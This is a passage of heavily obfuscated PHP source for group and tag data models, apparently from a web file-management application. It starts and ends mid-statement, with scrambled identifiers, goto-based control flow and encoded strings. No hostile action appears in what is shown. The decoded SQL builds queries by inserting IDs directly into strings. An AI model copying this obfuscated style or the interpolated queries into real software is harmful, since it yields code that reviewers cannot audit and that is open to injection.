¿Õ[352]] = count($e«£á¥õ×[$eÑ—×À ¿Õ[354]]); goto fÔ®†Ş›÷; fÔ®†Ş›÷: $e«£á¥õ×[$eÑ—×À ¿Õ[351]][$eÑ—×À ¿Õ[353]] = ceil($e«£á¥õ×[$eÑ—×À ¿Õ[351]][$eÑ—×À ¿Õ[352]] / $e«£á¥õ×[$eÑ—×À ¿Õ[351]][$eÑ—×À ¿Õ[349]]); goto EğÜá—é¹; EğÜá—é¹: } $this->_listDataApply($e«£á¥õ×[$eÑ—×À ¿Õ[354]]); return $e«£á¥õ×; goto E®ì„£ˆÂ; E®ì„£ˆÂ: } protected function groupChildrenAll($D‰—Õ×ÔîÃ) { $e‰†ÓòäÅ‹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$D‰—Õ×ÔîÃ) { return !1; } if (is_string($D‰—Õ×ÔîÃ)) { $D‰—Õ×ÔîÃ = array($D‰—Õ×ÔîÃ); } $bö¦ÊÓ İ = $D‰—Õ×ÔîÃ; foreach ($D‰—Õ×ÔîÃ as $CƒÛ›©µ) { $e‡Åã²â• = $this->getInfoSimple($CƒÛ›©µ); $f¤©„ø¨• = array($e‰†ÓòäÅ‹[461] => array($e‰†ÓòäÅ‹[752], $e‡Åã²â•[$e‰†ÓòäÅ‹[461]] . $CƒÛ›©µ . $e‰†ÓòäÅ‹[486])); $A‡¹±áğ£ = $this->field($e‰†ÓòäÅ‹[2112])->where($f¤©„ø¨•)->select(); $bö¦ÊÓ İ = array_merge($bö¦ÊÓ İ, array_to_keyvalue($A‡¹±áğ£, $e‰†ÓòäÅ‹[33], $e‰†ÓòäÅ‹[2112])); } return array_unique($bö¦ÊÓ İ); } private function _searchFromMeta($F†²Ù‰Šå, $dóÏŠ‘¾ÓÓ, $Eª†º­£Ì», $aÂ¹¹‹à¼è) { goto aŠ†Ùµ”•; fßÂ›Š¦Ó: if ($aÂ¹¹‹à¼è) { $A§ÇÖ“¢İä[$f†á§£Ãä[2112]] = array($f†á§£Ãä[7], $aÂ¹¹‹à¼è); } $e„Ší™µÄæ = Model($f†á§£Ãä[2198])->where($A§ÇÖ“¢İä)->limit($Eª†º­£Ì»)->select(); if (!$e„Ší™µÄæ) { return array(); } goto a˜ÁÅâêÌÈ; a˜ÁÅâêÌÈ: $e„Ší™µÄæ = array_to_keyvalue($e„Ší™µÄæ, $f†á§£Ãä[33], $f†á§£Ãä[2112]); $dßŒ¸ËŠ = $this->where(array($f†á§£Ãä[2189] => array($f†á§£Ãä[7], $e„Ší™µÄæ)))->select(); if (!$dßŒ¸ËŠ) { return array(); } goto fäĞ±Úè¡È; fäĞ±Úè¡È: return $dßŒ¸ËŠ; goto a…—‹¤ÈÑ‰; aŠ†Ùµ”•: $f†á§£Ãä =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dóÏŠ‘¾ÓÓ = strtolower($dóÏŠ‘¾ÓÓ); $A§ÇÖ“¢İä = array($f†á§£Ãä[89] => $F†²Ù‰Šå, $f†á§£Ãä[359] => array($f†á§£Ãä[752], "\x25{$dóÏŠ‘¾ÓÓ}\x25")); goto fßÂ›Š¦Ó; a…—‹¤ÈÑ‰: } protected function _listDataApplyItem($fá¹‡ªî‰‡) { $Bï¼§×¯—Î = array($fá¹‡ªî‰‡); $this->_listDataApply($Bï¼§×¯—Î); return $Bï¼§×¯—Î[0]; } protected function _listDataApply(&$eÃ©š¯Ò–î) { goto A™‰¤ˆŞ; A™‰¤ˆŞ: $fƒ‚ôÉ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$eÃ©š¯Ò–î) { return; } $B°™Â›È…å = array_to_keyvalue($eÃ©š¯Ò–î, $fƒ‚ôÉ[33], $fƒ‚ôÉ[2112]); goto Fƒèâ³¶äˆ; Dğå†ç’ö: $this->_listAppendParent($eÃ©š¯Ò–î); $this->_listAppendSourceRoot($eÃ©š¯Ò–î, $B°™Â›È…å); goto fŸĞÑå„é; Fƒèâ³¶äˆ: $this->_listAppendChildren($eÃ©š¯Ò–î); $this->_listAppendChildrenMember($eÃ©š¯Ò–î); $this->_listAppendMeta($eÃ©š¯Ò–î, $B°™Â›È…å); goto Dğå†ç’ö; fŸĞÑå„é: } private function _listAppendChildren(&$CÁ¤®ÔÒ¼») { goto FŸê‡áïï; F„°ŒÍŠó: $C‹Çãğ£º¤ = count($CÁ¤®ÔÒ¼»); $a¾†ˆÏÙ²ï = $this->tablePrefix . $this->tableName; for ($E‰—‰ŞÃ°— = 0, $e²Ô¾¿Ô§ˆ = 0; $E‰—‰ŞÃ°— < $C‹Çãğ£º¤; $E‰—‰ŞÃ°—++) { $e²Ô¾¿Ô§ˆ++; $dçÉ×Â•—Ò = $CÁ¤®ÔÒ¼»[$E‰—‰ŞÃ°—][$C†ó‰õÓ˜¦[2112]]; $A’¢®âöË .= "\x53\105\x4c\x45\x43\x54\x20\52\x20\x46\122\117\115\40\x28\x53\x45\x4c\x45\103\124\x20\x27{$dçÉ×Â•—Ò}\137\x63\150\151\x6c\x64\47\40\x61\163\40\x68\141\x73\x20\x46\x52\x4f\115\40\140{$a¾†ˆÏÙ²ï}\x60\40\x77\150\145\x72\x65\40\x70\x61\x72\x65\x6e\x74\111\x44\x3d{$dçÉ×Â•—Ò}\x20\154\151\155\151\164\x20\61\51\x20\x61\163\40\164\x62\137{$dçÉ×Â•—Ò}\x20\x75\x6e\151\x6f\x6e\40\x61\x6c\x6c\x20"; if (($e²Ô¾¿Ô§ˆ >= 20 || $E‰—‰ŞÃ°— == $C‹Çãğ£º¤ - 1) && $A’¢®âöË) { $A’¢®âöË = substr($A’¢®âöË, 0, -strlen($C†ó‰õÓ˜¦[451])); $A”˜Ô¿åãè = $this->query($A’¢®âöË); $bƒˆìÑ‰ = array_merge($bƒˆìÑ‰, $A”˜Ô¿åãè); $e²Ô¾¿Ô§ˆ = 0; $A’¢®âöË = $C†ó‰õÓ˜¦[33]; } } goto CÁò±‚ğ›Ş; CÁò±‚ğ›Ş: $bƒˆìÑ‰ = array_to_keyvalue($bƒˆìÑ‰, $C†ó‰õÓ˜¦[452]); foreach ($CÁ¤®ÔÒ¼» as &$DÃ‡ãôÑ÷) { $DÃ‡ãôÑ÷[$C†ó‰õÓ˜¦[2199]] = isset($bƒˆìÑ‰[$DÃ‡ãôÑ÷[$C†ó‰õÓ˜¦[2112]] . $C†ó‰õÓ˜¦[2200]]); } goto cÕæ—İªê“; FŸê‡áïï: $C†ó‰õÓ˜¦ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A’¢®âöË = $C†ó‰õÓ˜¦[361]; $bƒˆìÑ‰ = array(); goto F„°ŒÍŠó; cÕæ—İªê“: } private function _listAppendChildrenMember(&$aö´ íì¬Ñ) { goto bã‰¯·´Ÿ; Cì˜Çšù: $a›Äò…øµà = count($aö´ íì¬Ñ); $a÷±‰è‡ô = $this->tablePrefix . $Aà˜¯¾¬Ñ‚[2191]; for ($d—§ËØ­”· = 0, $f±å÷²ãË = 0; $d—§ËØ­”· < $a›Äò…øµà; $d—§ËØ­”·++) { $f±å÷²ãË++; $FÇÜ±„³Ñ = $aö´ íì¬Ñ[$d—§ËØ­”·][$Aà˜¯¾¬Ñ‚[2112]]; $c…¥¯³”Àô .= "\123\105\114\105\103\124\x20\x2a\40\x46\122\117\115\40\50\123\105\114\105\103\124\40\x27{$FÇÜ±„³Ñ}\x5f\x63\x68\151\x6c\144\x27\x20\x61\x73\x20\x68\141\163\x20\x46\x52\117\x4d\x20\140{$a÷±‰è‡ô}\140\40\x77\150\145\162\x65\40\x67\x72\157\165\x70\111\x44\75{$FÇÜ±„³Ñ}\x20\154\151\155\x69\164\40\61\51\x20\141\x73\x20\164\x62\x5f{$FÇÜ±„³Ñ}\40\165\x6e\151\x6f\156\40\x61\x6c\x6c\40"; if (($f±å÷²ãË >= 20 || $d—§ËØ­”· == $a›Äò…øµà - 1) && $c…¥¯³”Àô) { $c…¥¯³”Àô = substr($c…¥¯³”Àô, 0, -strlen($Aà˜¯¾¬Ñ‚[451])); $DŞÆ°«™Ü‰ = $this->query($c…¥¯³”Àô); $aùÇ”í‚±Û = array_merge($aùÇ”í‚±Û, $DŞÆ°«™Ü‰); $f±å÷²ãË = 0; $c…¥¯³”Àô = $Aà˜¯¾¬Ñ‚[33]; } } goto D›÷Í…¡õ; D›÷Í…¡õ: $aùÇ”í‚±Û = array_to_keyvalue($aùÇ”í‚±Û, $Aà˜¯¾¬Ñ‚[452]); foreach ($aö´ íì¬Ñ as &$a¬Á‚œá£î) { $a¬Á‚œá£î[$Aà˜¯¾¬Ñ‚[2201]] = isset($aùÇ”í‚±Û[$a¬Á‚œá£î[$Aà˜¯¾¬Ñ‚[2112]] . $Aà˜¯¾¬Ñ‚[2200]]); } goto C§á÷•Œº; bã‰¯·´Ÿ: $Aà˜¯¾¬Ñ‚ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c…¥¯³”Àô = $Aà˜¯¾¬Ñ‚[361]; $aùÇ”í‚±Û = array(); goto Cì˜Çšù; C§á÷•Œº: } private function _listAppendMeta(&$CÖÚ˜â¸Î¤, $fµÑœ¯Œ—) { $B¬ƒ‘à½¥ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D†Ò²òç¡… = array($B¬ƒ‘à½¥[2112] => array($B¬ƒ‘à½¥[7], $fµÑœ¯Œ—)); $F™Ç½³‡ˆ­ = Model($B¬ƒ‘à½¥[2190])->where($D†Ò²òç¡…)->select(); $F™Ç½³‡ˆ­ = array_to_keyvalue_group($F™Ç½³‡ˆ­, $B¬ƒ‘à½¥[2112]); foreach ($F™Ç½³‡ˆ­ as &$Dù¶¾ÈÊØ„) { $Dù¶¾ÈÊØ„ = array_to_keyvalue($Dù¶¾ÈÊØ„, $B¬ƒ‘à½¥[89], $B¬ƒ‘à½¥[359]); } foreach ($CÖÚ˜â¸Î¤ as &$aš¹‡Á‘”¿) { $aš¹‡Á‘”¿[$B¬ƒ‘à½¥[417]] = array(); if (isset($F™Ç½³‡ˆ­[$aš¹‡Á‘”¿[$B¬ƒ‘à½¥[2112]]])) { $aš¹‡Á‘”¿[$B¬ƒ‘à½¥[417]] = $F™Ç½³‡ˆ­[$aš¹‡Á‘”¿[$B¬ƒ‘à½¥[2112]]]; } } } protected function parentLevelArray($c°×ù˜…ÇÃ) { $Cµ¯Ã£õÜ¬ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $c°×ù˜…ÇÃ = explode($Cµ¯Ã£õÜ¬[47], trim($c°×ù˜…ÇÃ, $Cµ¯Ã£õÜ¬[47])); $c°×ù˜…ÇÃ = array_remove_value($c°×ù˜…ÇÃ, $Cµ¯Ã£õÜ¬[470]); return $c°×ù˜…ÇÃ; } private function _listAppendParent(&$b½ÄĞ×ˆÁ¦) { goto AÊ”óŒ„Á; dæİ‘…„Á£: $eŸàÕ›™‰ = $GLOBALS[$cĞå•Ñ³„¡[6]][$cĞå•Ñ³„¡[84]][$cĞå•Ñ³„¡[2203]]; foreach ($b½ÄĞ×ˆÁ¦ as &$eÀÒõÖš¡) { $C˜Ğß½á¡á = $this->parentLevelArray($eÀÒõÖš¡[$cĞå•Ñ³„¡[461]]); $bà¦£è’æÈ = $cĞå•Ñ³„¡[33]; foreach ($C˜Ğß½á¡á as $F¿¾Ãè‰Ò => $eÉÉÊòé¡) { if ($eŸàÕ›™‰ && $F¿¾Ãè‰Ò == 0) { continue; } $bà¦£è’æÈ .= $eÅ®¢ÅÆ[$eÉÉÊòé¡] . $cĞå•Ñ³„¡[8]; } if ($C˜Ğß½á¡á) { $bà¦£è’æÈ .= $eÀÒõÖš¡[$cĞå•Ñ³„¡[28]]; } $eÀÒõÖš¡[$cĞå•Ñ³„¡[465]] = str_replace($cĞå•Ñ³„¡[469], $cĞå•Ñ³„¡[8], $bà¦£è’æÈ); } goto eÉ“µ­ÙÁ; AÊ”óŒ„Á: $cĞå•Ñ³„¡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eÅ®¢ÅÆ = array(); foreach ($b½ÄĞ×ˆÁ¦ as &$eÀÒõÖš¡) { $eÅ®¢ÅÆ[$eÀÒõÖš¡[$cĞå•Ñ³„¡[2112]]] = $eÀÒõÖš¡[$cĞå•Ñ³„¡[28]]; $C˜Ğß½á¡á = $this->parentLevelArray($eÀÒõÖš¡[$cĞå•Ñ³„¡[461]]); foreach ($C˜Ğß½á¡á as $eÉÉÊòé¡) { if (!isset($eÅ®¢ÅÆ[$eÉÉÊòé¡])) { $eÅ®¢ÅÆ[$eÉÉÊòé¡] = 0; } } } goto EÔƒğŒß¢æ; EÔƒğŒß¢æ: $EòÄãÒæ = array(); foreach ($eÅ®¢ÅÆ as $F¿¾Ãè‰Ò => $fÜ¶çâøÌ) { if (!$fÜ¶çâøÌ) { $EòÄãÒæ[] = $F¿¾Ãè‰Ò; } } if ($EòÄãÒæ) { $DÒ¢µâÍ„Î = array($cĞå•Ñ³„¡[2189] => array($cĞå•Ñ³„¡[384], $EòÄãÒæ)); $cÊèôìã©â = $this->field($cĞå•Ñ³„¡[2202])->where($DÒ¢µâÍ„Î)->select(); $eîÆ‰¬Œ© = array_to_keyvalue($cÊèôìã©â, $cĞå•Ñ³„¡[2112], $cĞå•Ñ³„¡[28]); $eÅ®¢ÅÆ = array_merge_index($eÅ®¢ÅÆ, $eîÆ‰¬Œ©); } goto dæİ‘…„Á£; eÉ“µ­ÙÁ: } private function _listAppendSourceRoot(&$FÙŠà‰³Ÿ, $DÛ÷ØÚ„ ) { goto Cˆèô‰¬Ş; dĞ÷œ¦“Öì: foreach ($FÙŠà‰³Ÿ as &$cšÎ‘¯ó…£) { $cšÎ‘¯ó…£[$d‹¼‚Ûóõ[391]] = $e…á˜ğŠË[$cšÎ‘¯ó…£[$d‹¼‚Ûóõ[2112]]] ? $e…á˜ğŠË[$cšÎ‘¯ó…£[$d‹¼‚Ûóõ[2112]]] : array(); } goto a¦˜ä‚­îÉ; Fëğ¿™ì×“: $e…á˜ğŠË = Model($d‹¼‚Ûóõ[753])->order($d‹¼‚Ûóõ[2205])->field($CéÍùæáëŞ)->where($A†ÑÅ­âŞ§)->select(); $e…á˜ğŠË = array_to_keyvalue($e…á˜ğŠË, $d‹¼‚Ûóõ[458]); $e…á˜ğŠË = array_remove_key($e…á˜ğŠË, $d‹¼‚Ûóõ[458]); goto dĞ÷œ¦“Öì; Cˆèô‰¬Ş: $d‹¼‚Ûóõ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A†ÑÅ­âŞ§ = array($d‹¼‚Ûóõ[371] => SourceModel::TYPE_GROUP, $d‹¼‚Ûóõ[463] => 0, $d‹¼‚Ûóõ[458] => array($d‹¼‚Ûóõ[7], $DÛ÷ØÚ„ )); $CéÍùæáëŞ = $d‹¼‚Ûóõ[2204]; goto Fëğ¿™ì×“; a¦˜ä‚­îÉ: } protected function groupMerge($Dî‡ÊÆ…Àª) { $Dî‡ÊÆ…Àª = array_values(array_unique($Dî‡ÊÆ…Àª)); $aêí•ŸÈŸÏ = array(); for ($E‹ƒ•¬¡ÁÙ = 0; $E‹ƒ•¬¡ÁÙ < count($Dî‡ÊÆ…Àª); $E‹ƒ•¬¡ÁÙ++) { $E®“öùÄŒè = !1; for ($DÖ­ƒ¿Š = 0; $DÖ­ƒ¿Š < count($Dî‡ÊÆ…Àª); $DÖ­ƒ¿Š++) { if ($E‹ƒ•¬¡ÁÙ == $DÖ­ƒ¿Š) { continue; } if ($this->isParentOf($Dî‡ÊÆ…Àª[$DÖ­ƒ¿Š], $Dî‡ÊÆ…Àª[$E‹ƒ•¬¡ÁÙ])) { $E®“öùÄŒè = !0; break; } } if (!$E®“öùÄŒè) { $aêí•ŸÈŸÏ[] = $Dî‡ÊÆ…Àª[$E‹ƒ•¬¡ÁÙ]; } } return $aêí•ŸÈŸÏ; } protected function isParentOf($aˆ†„ÍÀÉª, $B«ñÃŸÄå¶) { goto f»Æ¹ØÂ; e´·õ‘—ğ„: return !1; goto d§ÓÓÔÓ—£; dÃ‰É‘ª: $fàºí—Óˆ = $this->getInfoSimple($B«ñÃŸÄå¶); $cõ÷ãŒÁÌæ = $B¨×çºµì‘[$bƒ²¹è›–î[461]] . $aˆ†„ÍÀÉª . $bƒ²¹è›–î[47]; if (substr($fàºí—Óˆ[$bƒ²¹è›–î[461]], 0, strlen($cõ÷ãŒÁÌæ)) == $cõ÷ãŒÁÌæ) { return !0; } goto e´·õ‘—ğ„; f»Æ¹ØÂ: $bƒ²¹è›–î =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$aˆ†„ÍÀÉª || !$B«ñÃŸÄå¶ || $aˆ†„ÍÀÉª == $B«ñÃŸÄå¶) { return !1; } $B¨×çºµì‘ = $this->getInfoSimple($aˆ†„ÍÀÉª); goto dÃ‰É‘ª; d§ÓÓÔÓ—£: } public function groupShowRoot($cÇò’¿âİ, $BŒ¿Ú‰Š¬Ÿ = false) { goto b‹ªÍöË›ƒ; AÜ—¿°ÈÕ: if (!$AÎ¢ùòèœˆ[$bã£Œ¾ã[417]] || !isset($AÎ¢ùòèœˆ[$bã£Œ¾ã[417]][$bã£Œ¾ã[2187]]) || $AÎ¢ùòèœˆ[$bã£Œ¾ã[417]][$bã£Œ¾ã[2187]] == $bã£Œ¾ã[2160]) { return $this->groupShowRoot($B•Ó·ñÒ£…[count($B•Ó·ñÒ£…) - 1], $BŒ¿Ú‰Š¬Ÿ); } if ($AÎ¢ùòèœˆ[$bã£Œ¾ã[417]][$bã£Œ¾ã[2187]] == $bã£Œ¾ã[346]) { $bí¶ÖÏ±ÑÙ = explode($bã£Œ¾ã[47], $AÎ¢ùòèœˆ[$bã£Œ¾ã[417]][$bã£Œ¾ã[2188]]); if ($bí¶ÖÏ±ÑÙ) { $aôç½íİ½Ã = array_merge($aôç½íİ½Ã, $bí¶ÖÏ±ÑÙ); } } return $aôç½íİ½Ã; goto f»–Ø¼¸ğÉ; C‹“çĞ²’è: $aôç½íİ½Ã = array($cÇò’¿âİ); if (count($B•Ó·ñÒ£…) == 0) { return $aôç½íİ½Ã; } if ($BŒ¿Ú‰Š¬Ÿ && count($B•Ó·ñÒ£…) == 1) { return $aôç½íİ½Ã; } goto AÜ—¿°ÈÕ; b‹ªÍöË›ƒ: $bã£Œ¾ã =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AÎ¢ùòèœˆ = $this->getInfo($cÇò’¿âİ); $B•Ó·ñÒ£… = $this->parentLevelArray($AÎ¢ùòèœˆ[$bã£Œ¾ã[461]]); goto C‹“çĞ²’è; f»–Ø¼¸ğÉ: } protected function resetParentLevel() { $BŸƒ™†®Š =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aãäÆÒ«Ãé = $BŸƒ™†®Š[2112]; $A“°¹†Í‰õ = $this->select(); $A“°¹†Í‰õ = array_to_keyvalue($A“°¹†Í‰õ, $aãäÆÒ«Ãé); foreach ($A“°¹†Í‰õ as $Eğ„ÂŠÊÚŠ) { goto bÊŠªƒĞâŒ; bÊŠªƒĞâŒ: $BóŠš“ì«Á = $Eğ„ÂŠÊÚŠ; $Cïç¡Àƒ… = array(); while ($BóŠš“ì«Á[$BŸƒ™†®Š[463]] != 0) { $Cïç¡Àƒ…[] = $BóŠš“ì«Á[$BŸƒ™†®Š[463]]; $BóŠš“ì«Á = $A“°¹†Í‰õ[$BóŠš“ì«Á[$BŸƒ™†®Š[463]]]; } goto d÷É¸ãŒßĞ; d÷É¸ãŒßĞ: $Cïç¡Àƒ…[] = 0; $Cïç¡Àƒ… = $BŸƒ™†®Š[47] . implode($BŸƒ™†®Š[47], array_reverse($Cïç¡Àƒ…)) . $BŸƒ™†®Š[47]; $this->setNamePinyin($Eğ„ÂŠÊÚŠ[$aãäÆÒ«Ãé], $Eğ„ÂŠÊÚŠ[$BŸƒ™†®Š[28]]); goto bØ•²À†­Ö; bØ•²À†­Ö: $this->where(array($aãäÆÒ«Ãé => $Eğ„ÂŠÊÚŠ[$aãäÆÒ«Ãé]))->save(array($BŸƒ™†®Š[527] => $Cïç¡Àƒ…)); goto B®ßçÚİ†Á; B®ßçÚİ†Á: } return $A“°¹†Í‰õ; } public function groupNameAuto($aÉ»½©ôâÜ, $AœœœÍªî÷) { $D¬»ß·ôŒÇ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C¢ò®‰Ïçô = $this->where(array($D¬»ß·ôŒÇ[368] => $aÉ»½©ôâÜ))->getField($D¬»ß·ôŒÇ[28], !0); if (!$C¢ò®‰Ïçô || !in_array($AœœœÍªî÷, $C¢ò®‰Ïçô)) { return $AœœœÍªî÷; } for ($A”Ï‚êœø˜ = 1; $A”Ï‚êœø˜ <= count($C¢ò®‰Ïçô) + 1; $A”Ï‚êœø˜++) { $b¹Ö‘Í  = $AœœœÍªî÷ . "\50{$A”Ï‚êœø˜}\51"; if (!in_array($b¹Ö‘Í , $C¢ò®‰Ïçô)) { return $b¹Ö‘Í ; } } } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\x66\141\166"; protected function cacheFunctionAlias($e¯“ëÓ˜Èë) { $eÛ‹©¦Ç« =& $_SERVER[´Ù×Íå‘ÄõÛ]; return array($eÛ‹©¦Ç«[2206] => array($e¯“ëÓ˜Èë[0], $eÛ‹©¦Ç«[2207]), $eÛ‹©¦Ç«[2208] => array($e¯“ëÓ˜Èë[0], $eÛ‹©¦Ç«[2209])); } protected function get($AÔºõ‚‰) { $C´àáõğ– =& $_SERVER[´Ù×Íå‘ÄõÛ]; $EÍÈ±ğ¸º½ = Model($C´àáõğ–[460])->metaGet($AÔºõ‚‰, $C´àáõğ–[2210]); $E«ÔÕÁ˜•İ = json_decode($EÍÈ±ğ¸º½, !0); return $E«ÔÕÁ˜•İ ? $E«ÔÕÁ˜•İ : array($C´àáõğ–[2211] => $C´àáõğ–[83], $C´àáõğ–[354] => array()); } protected function set($c¹†ŸØ×ë, $F»ÁÜÈ¡á¸) { $AòÛğ‘—„æ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F»ÁÜÈ¡á¸ = $F»ÁÜÈ¡á¸ ? $F»ÁÜÈ¡á¸ : array($AòÛğ‘—„æ[2211] => $AòÛğ‘—„æ[83], $AòÛğ‘—„æ[354] => array()); Model($AòÛğ‘—„æ[460])->metaSet($c¹†ŸØ×ë, $AòÛğ‘—„æ[2210], json_encode($F»ÁÜÈ¡á¸)); return Model($AòÛğ‘—„æ[460])->metaSet($c¹†ŸØ×ë, $AòÛğ‘—„æ[2210], json_encode($F»ÁÜÈ¡á¸)); } protected function getByTagID($B»ÕæŒ”², $F¾ä»§±Õò) { goto A¶ÕŒì®ÆŠ; E‹¨è»…›ö: $EõÂÙ‹°‡ = $this->get($B»ÕæŒ”²); if (!$EõÂÙ‹°‡ || !isset($EõÂÙ‹°‡[$aâŞÁ•Ğ§¥[354]])) { return !1; } $e„³æŸæÀ™ = array_find_by_field($EõÂÙ‹°‡[$aâŞÁ•Ğ§¥[354]], $aâŞÁ•Ğ§¥[367], $F¾ä»§±Õò); goto Añíˆ’œ‚­; A¶ÕŒì®ÆŠ: $aâŞÁ•Ğ§¥ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$B»ÕæŒ”² || !$F¾ä»§±Õò) { return !1; } if (!Model($aâŞÁ•Ğ§¥[460])->getInfoSimple($B»ÕæŒ”²)) { return !1; } goto E‹¨è»…›ö; Añíˆ’œ‚­: return is_array($e„³æŸæÀ™) ? $e„³æŸæÀ™ : !1; goto b½ßâÂŠ‰»; b½ßâÂŠ‰»: } public function listSource($Dá¼Í¨•ô, $DÀ½œ²÷„á) { goto eÖ­¿«²ÓÓ; Aæ‚Î¹…¾¹: if (!$F¥’êÈä’ó || count($D‚†¥àº‘›) == $F¥’êÈä’ó[$AŒ´‡…šÒè[351]][$AŒ´‡…šÒè[352]]) { return $F¥’êÈä’ó; } $C´œÓÏ°å = array(); $aË© œ¾š = array_to_keyvalue($F¥’êÈä’ó[$AŒ´‡…šÒè[74]], $AŒ´‡…šÒè[33], $AŒ´‡…šÒè[369]); goto c–ÙŠŸ„×™; eÖ­¿«²ÓÓ: $AŒ´‡…šÒè =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($DÀ½œ²÷„á && !is_array($DÀ½œ²÷„á)) { $DÀ½œ²÷„á = array($DÀ½œ²÷„á); } $d¯Šà‚Èë¨ = $this->listData($Dá¼Í¨•ô); goto dä‰ã‡²ƒ; c–ÙŠŸ„×™: $EØÉ·¹ÍŞÖ = array_to_keyvalue($F¥’êÈä’ó[$AŒ´‡…šÒè[73]], $AŒ´‡…šÒè[33], $AŒ´‡…šÒè[369]); $Aî±å¸ÉôÂ = array_merge($EØÉ·¹ÍŞÖ, $aË© œ¾š); foreach ($D‚†¥àº‘› as $f¯­ÔŸ øÍ) { if (!in_array($f¯­ÔŸ øÍ, $Aî±å¸ÉôÂ)) { $C´œÓÏ°å[] = $f¯­ÔŸ øÍ; } } goto aù½ÍËŒ•; aù½ÍËŒ•: if ($C´œÓÏ°å) { $this->removeBySource($Dá¼Í¨•ô, $C´œÓÏ°å); } return $F¥’êÈä’ó; goto e°’ğõ¯¹Í; dä‰ã‡²ƒ: $Eİà§ï­í¤ = array(); foreach ($d¯Šà‚Èë¨ as $DĞÌâ –á ) { $f¯­ÔŸ øÍ = $DĞÌâ –á [$AŒ´‡…šÒè[75]]; if (!$f¯­ÔŸ øÍ) { continue; } if (!isset($Eİà§ï­í¤[$f¯­ÔŸ øÍ])) { $Eİà§ï­í¤[$f¯­ÔŸ øÍ] = array(); } $Eİà§ï­í¤[$f¯­ÔŸ øÍ][] = $DĞÌâ –á [$AŒ´‡…šÒè[393]]; } $D‚†¥àº‘› = array(); goto bÖØ‹Ù¹‹ò; bÖØ‹Ù¹‹ò: foreach ($Eİà§ï­í¤ as $BàÈº©òŒ => $aÎÈ†¯å¦) { $Eîè‡ÙÒå = !0; if (!$DÀ½œ²÷„á) { $D‚†¥àº‘›[] = $BàÈº©òŒ; continue; } foreach ($DÀ½œ²÷„á as $DË¿çİÉç) { if (!in_array($DË¿çİÉç, $aÎÈ†¯å¦)) { $Eîè‡ÙÒå = !1; break; } } if ($Eîè‡ÙÒå) { $D‚†¥àº‘›[] = $BàÈº©òŒ; } } if (!$D‚†¥àº‘›) { return array(); } $F¥’êÈä’ó = Model($AŒ´‡…šÒè[1121])->listSource(array($AŒ´‡…šÒè[383] => array($AŒ´‡…šÒè[384], $D‚†¥àº‘›))); goto Aæ‚Î¹…¾¹; e°’ğõ¯¹Í: } protected function listData($fÇÜ’‘ƒÙ) { $e…äÇó‰ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bÅô©¬™À§ = array($e…äÇó‰[1432] => 0, $e…äÇó‰[436] => array($e…äÇó‰[2212], 0), $e…äÇó‰[388] => $e…äÇó‰[2213] . $fÇÜ’‘ƒÙ); $dÁé¬·ö—¾ = $e…äÇó‰[2214]; $F“ ÒàÔ“ö = $this->field($dÁé¬·ö—¾)->where($bÅô©¬™À§)->order($e…äÇó‰[2215])->select(); return $F“ ÒàÔ“ö ? $F“ ÒàÔ“ö : array(); } protected function addToTag($dêÑƒÓ´¾, $Cäñ‡ƒ·Ê§, $aÑ£æ‹¶ç) { $B«‡­åáò¤ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->getByTagID($dêÑƒÓ´¾, $aÑ£æ‹¶ç) || !$Cäñ‡ƒ·Ê§) { return !1; } if (!Model($B«‡­åáò¤[753])->pathInfo($Cäñ‡ƒ·Ê§)) { return !1; } $E¹òˆÚ§ãó = array($B«‡­åáò¤[1432] => 0, $B«‡­åáò¤[436] => $aÑ£æ‹¶ç, $B«‡­åáò¤[387] => $Cäñ‡ƒ·Ê§, $B«‡­åáò¤[388] => $B«‡­åáò¤[2216] . $dêÑƒÓ´¾, $B«‡­åáò¤[386] => $B«‡­åáò¤[33], $B«‡­åáò¤[2116] => 0); if ($this->where($E¹òˆÚ§ãó)->find()) { return !1; } return $this->add($E¹òˆÚ§ãó); } protected function removeFromTag($Dö…Ò÷‚“Î, $Eù›˜ëáº×, $bËŠ³’Ñ¬¥) { $f¯—´›ò¥ì =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->getByTagID($Dö…Ò÷‚“Î, $bËŠ³’Ñ¬¥) || !$Eù›˜ëáº×) { return !1; } if (is_array($Eù›˜ëáº×)) { $Eù›˜ëáº× = array($f¯—´›ò¥ì[7], $Eù›˜ëáº×); } $AÕ’ğÏ†Ôù = array($f¯—´›ò¥ì[1432] => 0, $f¯—´›ò¥ì[436] => $bËŠ³’Ñ¬¥, $f¯—´›ò¥ì[388] => $f¯—´›ò¥ì[2216] . $Dö…Ò÷‚“Î, $f¯—´›ò¥ì[387] => $Eù›˜ëáº×); return $this->where($AÕ’ğÏ†Ôù)->delete(); } protected function removeByTag($dÈô¦÷Ì¥, $BÌ™¸ò·) { $d°µºÅ˜ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->getByTagID($dÈô¦÷Ì¥, $BÌ™¸ò·)) { return !1; } $D’÷ì‹¸¨ = array($d°µºÅ˜[1432] => 0, $d°µºÅ˜[436] => $BÌ™¸ò·, $d°µºÅ˜[388] => $d°µºÅ˜[2216] . $dÈô¦÷Ì¥); return $this->where($D’÷ì‹¸¨)->delete(); } protected function removeBySource($dáÔá“ğÔ, $Eì½îÙ„º) { $fÙáæÙ‘ÆÙ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$dáÔá“ğÔ || !$Eì½îÙ„º) { return !1; } if (is_array($Eì½îÙ„º)) { $Eì½îÙ„º = array($fÙáæÙ‘ÆÙ[7], $Eì½îÙ„º); } $fĞ„ó‚¸ö = 